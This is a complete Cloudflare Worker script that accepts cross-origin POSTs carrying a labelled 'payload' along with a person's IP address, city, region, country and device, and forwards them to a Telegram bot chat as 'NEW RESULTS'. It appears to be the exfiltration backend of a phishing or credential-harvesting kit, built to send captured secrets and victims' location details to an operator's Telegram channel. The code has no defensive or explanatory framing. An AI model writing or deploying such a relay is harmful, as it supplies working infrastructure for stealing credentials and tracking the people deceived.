export default {
  async fetch(request, env, ctx) {
    // Enable CORS
    const corsHeaders = {
      'Access-Control-Allow-Origin': '*',
      'Access-Control-Allow-Methods': 'POST, OPTIONS',
      'Access-Control-Allow-Headers': 'Content-Type',
    };

    // Handle preflight requests
    if (request.method === 'OPTIONS') {
      return new Response(null, { headers: corsHeaders });
    }

    // Only allow POST requests
    if (request.method !== 'POST') {
      return new Response('Method not allowed', {
        status: 405,
        headers: corsHeaders
      });
    }

    try {
      const messageData = await request.json();

      // Validate required fields
      const requiredFields = ['category', 'payloadLabel', 'payload', 'time', 'ip', 'city', 'region', 'country', 'device'];
      for (const field of requiredFields) {
        if (!messageData[field]) {
          return new Response(`Missing required field: ${field}`, {
            status: 400,
            headers: corsHeaders
          });
        }
      }

      // Get credentials from environment variables
      const telegramBotToken = env.TELEGRAM_BOT_TOKEN;
      const chatId = env.TELEGRAM_CHAT_ID;

      if (!telegramBotToken || !chatId) {
        console.error('Missing Telegram credentials in environment variables');
        return new Response('Server configuration error', {
          status: 500,
          headers: corsHeaders
        });
      }

      // Escape HTML function
      const escapeHtml = (text) => String(text || '')
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;');

      // Build the HTML formatted message
      const message = `<b>🚨 NEW RESULTS 🚨</b>\n` +
        `<b>Category:</b> ${escapeHtml(messageData.category)}\n` +
        `<b>${escapeHtml(messageData.payloadLabel)}:</b> <code>${escapeHtml(messageData.payload)}</code>\n` +
        `<b>Time:</b> ${escapeHtml(messageData.time)}\n` +
        `<b>IP:</b> ${escapeHtml(messageData.ip)}\n` +
        `<b>City:</b> ${escapeHtml(messageData.city)}\n` +
        `<b>State:</b> ${escapeHtml(messageData.region)}\n` +
        `<b>Country:</b> ${escapeHtml(messageData.country)}\n` +
        `<b>Device:</b> ${escapeHtml(messageData.device)}`;

      // Send message to Telegram
      const telegramUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
      const telegramResponse = await fetch(telegramUrl, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          chat_id: chatId,
          text: message,
          parse_mode: 'HTML',
          disable_web_page_preview: true
        })
      });

      if (!telegramResponse.ok) {
        const errorText = await telegramResponse.text();
        console.error('Telegram API error:', telegramResponse.status, errorText);
        return new Response('Failed to send message to Telegram', {
          status: 500,
          headers: corsHeaders
        });
      }

      const telegramResult = await telegramResponse.json();

      if (!telegramResult.ok) {
        console.error('Telegram API returned error:', telegramResult);
        return new Response('Telegram API error', {
          status: 500,
          headers: corsHeaders
        });
      }

      return new Response(JSON.stringify({ success: true }), {
        status: 200,
        headers: {
          ...corsHeaders,
          'Content-Type': 'application/json'
        }
      });

    } catch (error) {
      console.error('Server error:', error);
      return new Response('Internal server error', {
        status: 500,
        headers: corsHeaders
      });
    }
  }
};